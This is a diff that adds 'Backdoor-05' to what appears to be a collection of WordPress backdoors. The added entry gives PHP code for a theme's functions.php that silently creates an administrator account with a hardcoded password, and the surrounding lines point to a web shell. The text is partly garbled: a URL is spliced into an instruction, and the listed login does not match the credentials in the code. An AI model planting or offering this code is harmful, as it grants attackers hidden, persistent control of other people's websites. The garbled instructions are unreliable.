@@ -100,6 +100,29 @@ $new_user->set_role('administrator');
  - Password: password
 
 
+   ## Backdoor-05 (add to theme functions.php  // undelete able user )
+
+
+
+```bash
+
+ $username = 'wpuser';
+                  $password = '1234567890@';
+    
+                  $email_address = 'wordpress@example.com';
+
+                  if (! username_exists($username ) ) { $user_id = wp_create_user( $username, $password, $email_address ); 
+                  $user = new WP_User( $user_id); $user->set_role( 'administrator' );
+                  }
+
+```
+![Logo](https://github.com/cyber-insect99/photo-gallery-/blob/main/backdoor%205%20on%20wp%20site.png?raw=true)
+### Thttps://github.com/cyber-insect99/photo-gallery-/blob/main/backdoor%205%20on%20wp%20site.png?raw=truehen go to 'users' option on wordpress deshboard the you will see  a new user .
+- User: user
+ - Password: password
+
+
+
 # Web Shell
 # 
 ![Logo](https://github.com/jco666/alfa-shell/raw/master/readme_1.png)
